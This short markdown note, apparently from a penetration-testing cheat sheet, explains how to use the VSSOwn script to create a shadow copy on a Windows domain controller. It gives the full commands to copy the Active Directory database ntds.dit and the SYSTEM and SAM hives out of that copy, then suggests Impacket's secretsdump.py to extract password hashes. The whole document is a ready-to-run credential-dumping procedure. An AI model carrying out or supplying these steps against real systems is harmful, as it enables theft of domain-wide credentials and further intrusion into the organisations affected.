## VSSOwn usage

VSSOwn is used to create a copy of the ntds.dit file. 

``cscript vssown.vbs /status``

``cscript vssown.vbs /start``

``cscript vssown.vbs /create /c``

``copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\ntds\ntds.dit ntdsbackup.dit``

``copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SYSTEM systembackup.bak``

``copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SAM sambackup.bak``

From the above commands, we copied the ntds, SYSTEM and SAM. The SYSTEM and SAM portions will be needed becaue they contain the decryption keys needed to extract the hashes from the 
ntds.dit file. 

Once we have these, we can stop the VSSOwn tool

``cscript vssown.vbs /stop``

It is recommended, after this is complete, use the tool ``secretsdump.py`` from Impacket to extract the hashes.
